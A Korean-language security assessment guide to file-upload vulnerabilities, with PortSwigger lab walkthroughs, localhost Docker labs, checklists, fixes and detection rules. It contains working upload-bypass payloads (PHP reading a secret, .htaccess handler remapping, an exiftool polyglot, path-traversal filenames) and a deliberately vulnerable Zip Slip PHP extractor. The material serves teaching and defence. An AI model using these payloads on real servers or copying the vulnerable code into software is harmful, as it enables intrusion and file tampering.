## 기법 요약표

| 기법 | 단서 기능 | 성립 조건 | 영향 |
|---|---|---|---|
| 확장자·MIME·매직바이트 우회 | 아바타, 첨부, 문서 제출 | 한 신호만 신뢰하거나 검사와 실행 시점의 이름이 다름 | 임의 파일 저장, 웹셸 실행 |
| 이중 확장자·서버 파서 차이 | 업로드 URL이 웹 루트에 노출됨 | 애플리케이션과 Apache·IIS·Nginx가 파일명을 다르게 해석 | 소스 노출 또는 코드 실행 |
| `.htaccess`·`web.config` 업로드 | 원래 확장자는 차단되지만 숨김·설정 파일은 허용 | 업로드 디렉터리에서 사용자 설정 재정의가 활성화됨 | 새 확장자를 실행기로 연결 |
| 폴리글랏 | 이미지 크기·시그니처 검사가 있음 | 유효한 이미지와 실행 코드가 한 파일에 공존하고 실행기가 도달 | 내용 검사 통과 후 코드 실행 |
| 저장 경로 조작 | 원본 파일명·`save_as`·폴더를 받음 | 정규화 후 기준 디렉터리 포함 여부를 확인하지 않음 | 덮어쓰기, 웹 루트·설정 경로 저장 |
| Zip Slip | ZIP·테마·플러그인 가져오기 | 엔트리 이름의 `../`·절대 경로를 그대로 추출 | 임의 파일 쓰기, 후속 코드 실행 |
| 이미지 처리기 공격면 | 썸네일·리사이즈·OCR | 비신뢰 파일을 취약하거나 과권한인 변환기가 파싱 | SSRF, 파일 읽기, 자원 고갈, 코드 실행 |
| 업로드 → 웹셸 → 실행 | 업로드 뒤 공개 URL 반환 | 실행 가능한 위치·확장자·핸들러가 동시에 성립 | 서버 권한의 파일 읽기·명령 실행 |

## 공통 판단 모델 — 업로드 성공과 실행 성공을 분리한다

업로드 취약점은 다음 네 관문을 따로 기록해야 한다.

1. **수신**: 프록시·WAF·프레임워크가 어떤 `filename`, `Content-Type`, 바이트를 보았는가.
2. **검사**: 확장자, MIME, 시그니처, 실제 디코딩 중 무엇을 어느 이름에 적용했는가.
3. **저장**: 최종 절대 경로·파일명·권한이 무엇이며 원본 이름과 같은가.
4. **제공·실행**: 별도 다운로드 핸들러가 바이트로 제공하는가, 웹 서버가 스크립트로 실행하는가.

`201 Created`만으로 원격 코드 실행이라고 보고하면 오탐이다. 반대로 스크립트 실행이 막혀도 기존 파일 덮어쓰기, 저장형 XSS, 악성 문서 배포, 변환기 공격은 별도 영향이다.

## 1. 확장자·MIME·매직바이트 검증 우회

### 원리·단서 기능·성립 조건

브라우저가 보내는 multipart 파트의 `Content-Type`과 `filename`은 사용자가 바꿀 수 있다. 매직바이트도 파일 선두의 짧은 표식일 뿐 전체 구조가 안전하다는 증거가 아니다. `image/jpeg` 헤더만 확인하거나 `GIF89a`로 시작하는지만 검사한 뒤, 원래 이름으로 웹 루트에 저장하면 세 신호 중 하나만 맞춰도 검사기를 통과할 수 있다.

- **단서 기능**: 프로필 사진, 게시판 첨부, 이력서·영수증 업로드, 업로드 직후 `/uploads/<원본명>`을 돌려주는 응답.
- **성립 조건**: denylist 방식, 클라이언트 MIME 신뢰, 선두 바이트만 검사, 저장 디렉터리의 스크립트 실행 중 하나 이상.

### 따라하기 — PortSwigger 공식 랩

랩: [Lab: Web shell upload via Content-Type restriction bypass](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass)

1. 랩 계정 `wiener:peter`로 로그인하고 정상 이미지를 업로드한다.
2. 업로드 요청을 Burp Repeater로 보내 파일 파트만 다음처럼 바꾼다. 랩이 요구하는 최소 PHP는 고정된 실습 secret만 읽는다.

```http
POST /my-account/avatar HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: multipart/form-data; boundary=LAB

--LAB
Content-Disposition: form-data; name="avatar"; filename="proof.php"
Content-Type: image/jpeg

<?php echo file_get_contents('/home/carlos/secret'); ?>
--LAB--
```

3. `GET /files/avatars/proof.php`를 요청한다.

**기대 결과와 성공 기준**: 업로드 응답이 성공하고, GET 응답에 랩의 secret이 나타나면 MIME 검사 우회와 PHP 실행을 모두 입증한 것이다. 업로드만 되고 PHP 원문이 내려오거나 다운로드되면 임의 파일 저장일 뿐 웹셸 실행은 입증되지 않았다.

### 진단 체크리스트·오탐 구분

- [ ] 대소문자, 다중 점, 허용/차단 확장자와 `Content-Type`을 독립적으로 바꿨다.
- [ ] 서버가 탐지한 MIME과 이미지 디코더의 성공 여부를 확인했다.
- [ ] 저장명·최종 URL·응답 `Content-Type`·`Content-Disposition`을 기록했다.
- [ ] 단순 4xx 차이, 깨진 미리보기, CDN 캐시만으로 실행을 주장하지 않았다.

### 조치

확장자는 디코딩·유니코드 정규화 뒤 작은 allowlist로 검사하고, 서버가 생성한 UUID 이름으로 웹 루트 밖에 저장한다. MIME과 시그니처는 보조 신호로 쓰되 이미지는 제한된 디코더로 열어 새 파일로 재인코딩한다. 공개가 필요하면 애플리케이션 다운로드 핸들러가 `Content-Disposition: attachment`와 고정 MIME으로 제공하고 업로드 저장소에서는 실행 권한을 제거한다.

```python
from pathlib import Path
from uuid import uuid4

ALLOWED_EXTENSIONS = {".jpg", ".png"}
UPLOAD_ROOT = Path("/srv/app-data/uploads").resolve()

def safe_storage_name(original_name: str) -> Path:
    extension = Path(original_name).suffix.lower()
    if extension not in ALLOWED_EXTENSIONS:
        raise ValueError("unsupported file type")
    return UPLOAD_ROOT / f"{uuid4().hex}{extension}"
```

### 탐지 포인트

같은 계정이 짧은 시간에 확장자·파트 MIME을 반복 변경하는 요청, 이미지 MIME인데 디코더가 실패한 파일, 업로드 직후 같은 파일에 GET이 이어지는 흐름, 업로드 디렉터리의 스크립트 실행 이벤트를 하나의 상관 규칙으로 묶는다.

## 2. 이중 확장자와 서버 파서 차이

### 원리·단서 기능·성립 조건

`photo.php.jpg`, `shell.asp;.jpg`, `image.jpg/index.php`는 문자열 하나지만 계층마다 의미가 다르다.

| 계층 | 위험한 차이 | 실제 성립 조건 |
|---|---|---|
| Apache | `AddHandler`가 여러 확장자 중 매핑된 확장자를 핸들러로 선택할 수 있음 | 해당 모듈·지시어가 활성화되고 업로드 위치에서 스크립트 핸들러가 적용됨 |
| 레거시 IIS | 세미콜론 뒤를 경로 정보처럼 다루던 역사적 조합 | 특정 구버전·매핑에서만 해당. 현대 IIS에 일반화하면 오탐 |
| Nginx + PHP-FPM | `PATH_INFO` 분리와 `fastcgi_split_path_info`·`SCRIPT_FILENAME` 조합이 실제 스크립트가 아닌 경로를 PHP로 넘길 수 있음 | 정규식 location과 FPM 설정이 잘못 맞물리고 대상 파일이 존재 |

단서는 애플리케이션은 마지막 확장자를 검사하지만 웹 서버는 앞 확장자나 경로 구간으로 핸들러를 정하는 구성, 프록시와 원본의 디코딩 횟수 차이다.

### 따라하기 — PortSwigger 공식 랩

랩: [Lab: Web shell upload via obfuscated file extension](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension)

Burp에서 랩의 업로드 요청 `filename`을 `proof.php%00.jpg`로 바꾸고, 본문은 랩 secret을 읽는 최소 PHP로 둔다. 랩 서버에서 URL 디코딩과 널 종료 해석이 갈리면 저장된 파일은 `proof.php`가 된다. 업로드 뒤 반환 경로를 GET하여 secret이 출력되는 것이 성공 기준이다.

```http
Content-Disposition: form-data; name="avatar"; filename="proof.php%00.jpg"
Content-Type: image/jpeg

<?php echo file_get_contents('/home/carlos/secret'); ?>
```

널바이트는 현대 런타임에서 대부분 차단되므로 실패가 정상일 수 있다. IIS 세미콜론·Nginx PATH_INFO도 **버전과 실제 설정을 확보한 뒤** 검사한다. 단지 서버 제품명이 같다는 이유로 취약하다고 판정하지 않는다.

### 진단 체크리스트·오탐 구분

- [ ] 검사 시 이름, 파일시스템 이름, 요청 URL, 웹 서버가 선택한 핸들러를 각각 확보했다.
- [ ] 대소문자·끝점·끝공백·이중 확장자·인코딩을 조합하되 결과 파일명을 확인했다.
- [ ] IIS·Nginx 동작을 최신 기본값이 아니라 대상 버전과 설정으로 재현했다.
- [ ] 정적 제공된 PHP 원문과 PHP 실행 결과를 구분했다.

### 조치·탐지 포인트

사용자 이름을 폐기하고 단일 허용 확장자를 서버가 붙인다. Nginx는 실제 스크립트 존재 여부를 확인하고 업로드 경로를 PHP location 밖에 둔다. Apache 업로드 디렉터리에는 `RemoveHandler`, `RemoveType`, 실행 금지 정책을 적용한다. 로그에서는 `%00`, 세미콜론, 연속 점, 혼합 대소문자, 업로드 직후 PATH_INFO가 붙은 조회를 탐지한다.

## 3. `.htaccess`·`web.config` 업로드

### 원리·단서 기능·성립 조건

확장자 차단이 완벽해도 업로드 위치의 서버 설정을 덮을 수 있으면 새 확장자를 실행기로 연결할 수 있다. Apache의 `.htaccess`는 `AllowOverride`가 허용한 범위에서 디렉터리별 설정을 바꾼다. IIS의 `web.config`도 해당 애플리케이션과 권한·위임 설정이 허용할 때 핸들러나 동작에 영향을 준다. **설정 파일이 저장되었다는 사실만으로 실행이 성립하지는 않는다.**

### 따라하기 — PortSwigger 공식 랩

랩: [Lab: Web shell upload via extension blacklist bypass](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass)

1. Burp Repeater에서 파일명을 `.htaccess`, MIME을 `text/plain`으로 바꾸고 다음 한 줄을 업로드한다.

```apache
AddType application/x-httpd-php .l33t
```

2. 이어 `proof.l33t`를 업로드한다.

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

3. `GET /files/avatars/proof.l33t`에서 secret이 출력되면 성공이다.

IIS에서는 실제 허가된 localhost 평가 환경이 없으면 공격용 `web.config`를 추측해 보내지 않는다. 대신 업로드된 `web.config`가 저장되는지, 상위/하위 구성 잠금과 handler delegation이 켜졌는지 관리자 설정으로 확인한다.

### 진단 체크리스트·오탐 구분

- [ ] 점파일·예약 설정 이름을 서버가 강제로 거부하는지 확인했다.
- [ ] 업로드 디렉터리의 `AllowOverride None`, IIS section locking을 확인했다.
- [ ] 설정 업로드 전후 동일 확장자의 응답 차이를 비교했다.
- [ ] 단순 500 오류를 코드 실행으로 판정하지 않았다.

### 조치·탐지 포인트

업로드 이름은 서버 생성값만 사용하고 `.htaccess`, `web.config`, `.user.ini` 같은 제어 파일명을 명시적으로 거부한다. Apache는 업로드 트리에서 `AllowOverride None`, IIS는 중요한 section을 잠그고 쓰기 계정과 설정 계정을 분리한다. 파일 무결성 감시에서 웹 루트 아래 새 설정 파일과 handler 매핑 변경을 최우선 경보로 둔다.

### 출처

- [Apache `.htaccess` tutorial](https://httpd.apache.org/docs/current/howto/htaccess.html)
- [Microsoft — IIS Configuration Section Locking](https://learn.microsoft.com/en-us/iis/get-started/planning-for-security/how-to-use-locking-in-iis-configuration)

## 4. 폴리글랏 파일

### 원리·단서 기능·성립 조건

폴리글랏은 두 파서가 같은 바이트를 각각 유효한 형식으로 받아들이는 파일이다. JPEG 메타데이터에 PHP를 넣으면 이미지 디코더는 정상 JPEG로 보고, PHP 핸들러는 `<?php ... ?>` 구간을 실행할 수 있다. 조건은 **실제 이미지 검사를 통과한 파일이 실행 가능한 이름·위치로 저장**되는 것이다.

### 따라하기 — PortSwigger 공식 랩

랩: [Lab: Remote code execution via polyglot web shell upload](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload)

공식 절차대로 정상 JPEG의 Comment에 랩 secret을 읽는 PHP를 넣어 `polyglot.php`로 만든다.

```bash
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" input.jpg -o polyglot.php
```

업로드 뒤 `GET /files/avatars/polyglot.php` 응답의 바이너리 사이에서 `START ... END`를 찾는다. 이미지 파싱 성공과 PHP 출력이 함께 관찰되어야 폴리글랏 실행 성공이다.

### 진단 체크리스트·오탐 구분

- [ ] 헤더 문자열뿐 아니라 전체 디코딩 성공 여부를 확인했다.
- [ ] EXIF·ICC·Comment 등 불필요한 메타데이터가 보존되는지 확인했다.
- [ ] 재인코딩 뒤 공격 문자열과 원본 메타데이터가 사라지는지 비교했다.
- [ ] 파일 안에 PHP 문자열이 있다는 이유만으로 실행 가능하다고 판정하지 않았다.

### 조치·탐지 포인트

검증된 디코더로 픽셀을 읽어 새 파일로 재인코딩하고 메타데이터를 제거한다. 결과는 웹 루트 밖 새 UUID로 저장한다. 탐지 시 이미지에서 스크립트 시작 태그, 비정상적으로 큰 메타데이터, 확장자·탐지 MIME 불일치를 보되, 차단은 재인코딩 실패와 정책 위반을 함께 근거로 삼는다.

### 출처

- [ExifTool — Writing Meta Information](https://exiftool.org/writing.html)
- [OWASP File Upload Cheat Sheet — File Content Validation](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html#file-content-validation)

## 5. 경로 조작으로 저장 위치 바꾸기

### 원리·단서 기능·성립 조건

multipart의 `filename`, 별도 `save_as`, 사용자 폴더 값을 기준 경로에 문자열로 붙이면 `../`·절대 경로·역슬래시가 저장 위치를 바꾼다. 파일명 정제 전에 디코딩하거나, 검사 후 다시 디코딩하는 계층이 있어도 같은 문제가 생긴다.

### 따라하기 — PortSwigger 공식 랩

랩: [Lab: Web shell upload via path traversal](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal)

랩에서 PHP 업로드가 허용되지만 기본 업로드 폴더에서는 실행되지 않는다. Burp에서 파일명을 `..%2fproof.php`로 바꾸어 상위 실행 가능 디렉터리에 저장한 뒤 `GET /files/avatars/../proof.php`로 조회한다. 랩 secret 출력이 성공 기준이다.

```http
Content-Disposition: form-data; name="avatar"; filename="..%2fproof.php"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>
```

### 진단 체크리스트·오탐 구분

- [ ] `/`, `\`, 절대 경로, 인코딩된 구분자와 Unicode 정규화 결과를 확인했다.
- [ ] 저장 뒤 서버가 반환한 이름이 아니라 실제 정규화 경로를 확인했다.
- [ ] 기존 파일 덮어쓰기와 새 파일 쓰기를 별도 영향으로 기록했다.
- [ ] 애플리케이션이 원본명을 표시만 하고 저장명은 UUID로 바꾼 경우를 오탐에서 제외했다.

### 조치·탐지 포인트

클라이언트 파일명은 표시용 메타데이터로만 보관하고 저장 경로에는 쓰지 않는다. 반드시 써야 하면 정규화한 최종 경로가 기준 디렉터리의 자식인지 경로 요소 단위로 확인하고, 심볼릭 링크를 따르지 않는 안전한 파일 API를 사용한다. `../`, `%2f`, `%5c`, 드라이브 문자, UNC 접두사와 업로드 경로 밖 파일 생성 이벤트를 연계 탐지한다.

### 출처

- [OWASP Path Traversal Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Path_Traversal_Prevention_Cheat_Sheet.html)
- [CWE-22 — Improper Limitation of a Pathname](https://cwe.mitre.org/data/definitions/22.html)

## 6. Zip Slip — 압축 엔트리 이름이 저장 경로가 될 때

### 원리·단서 기능·성립 조건

ZIP의 각 엔트리는 파일 데이터뿐 아니라 이름도 가진다. 추출기가 `destination + entry_name`만 수행하면 `../../outside.php`가 대상 디렉터리 밖으로 나간다. 절대 경로, 역슬래시, 심볼릭 링크 엔트리까지 고려해야 한다.

### 따라하기 — localhost Docker

아래 앱은 `127.0.0.1`에만 노출되며, ZIP 엔트리를 의도적으로 안전하지 않게 풀어 Zip Slip을 보여준다.

`docker-compose.yml`:

```yaml
services:
  upload-lab:
    build: .
    ports:
      - "127.0.0.1:8088:80"
```

`Dockerfile`:

```dockerfile
FROM php:8.2-apache
RUN apt-get update \
    && apt-get install -y --no-install-recommends libzip-dev \
    && docker-php-ext-install zip \
    && rm -rf /var/lib/apt/lists/*
COPY index.php /var/www/html/index.php
RUN mkdir -p /var/www/html/extracted /var/www/html/work \
    && chown -R www-data:www-data /var/www/html/extracted /var/www/html/work
```

`index.php`:

```php
<?php
declare(strict_types=1);

if ($_SERVER['REQUEST_METHOD'] !== 'POST' || !isset($_FILES['archive'])) {
    http_response_code(400);
    echo "POST archive required\n";
    exit;
}

$zipPath = '/var/www/html/work/upload.zip';
move_uploaded_file($_FILES['archive']['tmp_name'], $zipPath);
$zip = new ZipArchive();
if ($zip->open($zipPath) !== true) {
    http_response_code(400);
    echo "invalid zip\n";
    exit;
}

$destination = '/var/www/html/extracted';
for ($i = 0; $i < $zip->numFiles; $i++) {
    $entry = $zip->getNameIndex($i);
    $target = $destination . '/' . $entry; // intentionally vulnerable
    if (str_ends_with($entry, '/')) {
        @mkdir($target, 0777, true);
        continue;
    }
    @mkdir(dirname($target), 0777, true);
    file_put_contents($target, $zip->getFromIndex($i));
}
$zip->close();
echo "extracted\n";
```

실습 폴더에 세 파일을 저장하고 실행한다.

```bash
docker compose up --build -d
python -c "import zipfile; z=zipfile.ZipFile('slip.zip','w'); z.writestr('../escaped.txt','ZIP_SLIP_OK'); z.close()"
curl -s -F "archive=@slip.zip" http://127.0.0.1:8088/
curl -s http://127.0.0.1:8088/escaped.txt
# 기대: ZIP_SLIP_OK
```

**성공 기준**: 추출 기준 `/var/www/html/extracted` 밖인 `/var/www/html/escaped.txt`가 생성되고 HTTP로 읽힌다. 실습 후 `docker compose down -v`로 컨테이너를 제거한다.

> [!success] 직접 검증
> 2026-11-27 Docker Engine 29.5.2에서 글의 파일 그대로 빌드·실행해 `extracted` 밖의 `/var/www/html/escaped.txt` 생성과 `ZIP_SLIP_OK` 응답을 확인했다.

### 진단 체크리스트·오탐 구분

- [ ] 모든 엔트리를 추출 전에 열거하고 정규화된 목적지를 기록했다.
- [ ] `../`, `..\`, 절대 경로, 드라이브·UNC, 심볼릭 링크를 검사했다.
- [ ] 총 압축 해제 크기·파일 수·중첩 깊이는 [[웹 취약점 진단 — API 자원 소비 진단(Unrestricted Resource Consumption, API4)]] 기준으로 별도 확인했다.
- [ ] 라이브러리가 위험 엔트리를 자동 제거했다면 실제 기준 경로 밖 파일이 없는지 확인하고 오탐 처리했다.

### 조치

```python
from pathlib import Path

def safe_zip_target(root: Path, entry_name: str) -> Path:
    root = root.resolve()
    target = (root / entry_name).resolve()
    if root not in target.parents:
        raise ValueError("zip entry escapes extraction root")
    return target
```

추출 전 모든 엔트리를 검사하고, 심볼릭 링크를 거부하며, 검사한 바로 그 경로에 원자적으로 쓴다. 별도 저권한 컨테이너에서 크기·파일 수·시간 제한을 적용한다.

### 탐지 포인트·출처

압축 엔트리의 `..`·절대 경로·역슬래시, 추출 프로세스가 작업 디렉터리 밖에 만든 파일, 추출 직후 웹 루트의 새 스크립트를 탐지한다.

- [Snyk — Zip Slip Vulnerability](https://security.snyk.io/research/zip-slip-vulnerability)
- [Python `zipfile` extraction warning](https://docs.python.org/3/library/zipfile.html#zipfile.ZipFile.extractall)

## 7. 이미지 처리 라이브러리 취약점 — ImageMagick 계열은 원리만

### 원리·단서 기능·성립 조건

업로드 파일이 안전하게 저장되어도 썸네일러·메타데이터 추출기·OCR이 비신뢰 바이트를 파싱한다. ImageMagick 계열은 여러 coder와 delegate를 통해 외부 형식·프로세스를 다루므로, 취약 버전 또는 과도한 `policy.xml` 권한과 결합하면 파일 읽기·네트워크 접근·명령 실행·자원 고갈로 이어질 수 있다.

이 절은 과거 ImageTragick 페이로드를 재현하지 않는다. 제품·버전·정책별 조건이 강하고, 오래된 공격 문자열을 최신 기본값에 보내는 것은 진단 품질이 낮다.

### 따라하기 — 안전한 localhost 점검

공격 대신 컨테이너의 형식·정책·자원 제한을 확인한다.

```bash
docker run --rm --network none --memory 256m --cpus 0.5 \
  docker.io/dpokidov/imagemagick:7.1.1-47 \
  sh -lc 'magick -version; magick -list policy'
```

**기대 결과와 성공 기준**: 버전, 활성 policy, 허용 coder가 출력되고 컨테이너 네트워크가 `none`이다. 이는 취약점 악용 성공이 아니라 **평가 환경의 방어 조건 확인**이다. 실제 진단은 자산의 고정 버전을 벤더 공지와 대조하고, 무해한 정상 이미지의 변환 성공·한도 초과 실패를 확인한다.

### 진단 체크리스트·오탐 구분

- [ ] 호출 바이너리와 실제 로드 라이브러리 버전을 확인했다.
- [ ] 필요 없는 coder·delegate, `URL`·`HTTPS`·`MVG`·`MSL`·`PDF` 권한을 정책에서 줄였다.
- [ ] 변환 컨테이너에 네트워크·파일시스템·CPU·메모리·시간 제한이 있다.
- [ ] 버전 문자열만으로 취약 판정하지 않고 벤더 패치·배포판 백포트를 확인했다.

### 조치·탐지 포인트

지원 버전으로 업데이트하고 허용 형식만 남긴 policy를 배포한다. 변환기는 읽기 전용 루트, 임시 작업 폴더, 비루트 계정, 무네트워크 컨테이너에서 실행한다. delegate 실행, 변환기의 외부 DNS/HTTP, 작업 폴더 밖 파일 접근, 비정상 CPU·메모리 사용을 감시한다.

### 출처

- [ImageMagick Security Policy](https://imagemagick.org/script/security-policy.php)
- [ImageTragick disclosure](https://imagetragick.com/)
- [OWASP Server-Side Document and Media Rendering Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Document_and_Media_Rendering_Security_Cheat_Sheet.html)

## 8. 업로드 → 웹셸 → 실행까지 한 줄로 증명하기

### 원리·단서 기능·성립 조건

최종 영향은 `업로드 허용 → 공격자가 위치를 예측 → 웹 서버가 실행기로 전달 → 출력 확인`이 모두 이어질 때 성립한다. 중간 단계 하나라도 끊기면 영향은 달라진다.

### 따라하기 — PortSwigger 공식 랩

랩: [Lab: Remote code execution via web shell upload](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload)

랩에서 다음 최소 파일을 업로드한다.

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

```http
GET /files/avatars/proof.php HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```

응답에 secret이 나타나면 파일 쓰기와 PHP 실행을 함께 증명한다. 범용 `system($_GET['cmd'])` 웹셸은 이 실습에 필요하지 않다.

### 진단 체크리스트·오탐 구분·조치

- [ ] 업로드 요청 ID, 저장 경로, 실행 요청, 고정 marker 출력을 하나의 증거 사슬로 남겼다.
- [ ] 웹 프로세스 계정의 권한과 네트워크 도달 범위를 영향 산정에 반영했다.
- [ ] 실행 없이 정적 제공만 되면 RCE가 아닌 임의 파일 업로드로 낮춰 기록했다.
- [ ] 조치는 업로드 저장소 분리와 실행 금지, 랜덤 이름, 재인코딩, 최소 권한을 함께 적용했다.

탐지는 `POST multipart` 직후 같은 주체의 새 확장자 GET, 웹 프로세스의 셸·인터프리터 자식 프로세스, 업로드 디렉터리에서 실행된 스크립트, 비정상 내부망 연결을 연계한다.

### 출처

- [PortSwigger — Exploiting unrestricted file uploads to deploy a web shell](https://portswigger.net/web-security/file-upload#exploiting-unrestricted-file-uploads-to-deploy-a-web-shell)
- [MITRE ATT&CK T1505.003 — Web Shell](https://attack.mitre.org/techniques/T1505/003/)

## 다음 단계로 이어지는 공격

웹셸 실행을 얻으면 웹 프로세스 권한으로 설정·소스·자격증명을 읽고, 내부 API와 데이터베이스로 피벗하며, 쓰기 가능한 작업 경로에 지속성을 만들 수 있다. 실행이 막혀도 경로 조작·Zip Slip의 임의 파일 쓰기는 설정 덮어쓰기나 다음 재시작 시 코드 로드로 이어질 수 있다. 이미지 변환기 접근만 얻은 경우에도 내부망 SSRF·파일 읽기·서비스 거부가 다음 단계가 된다.
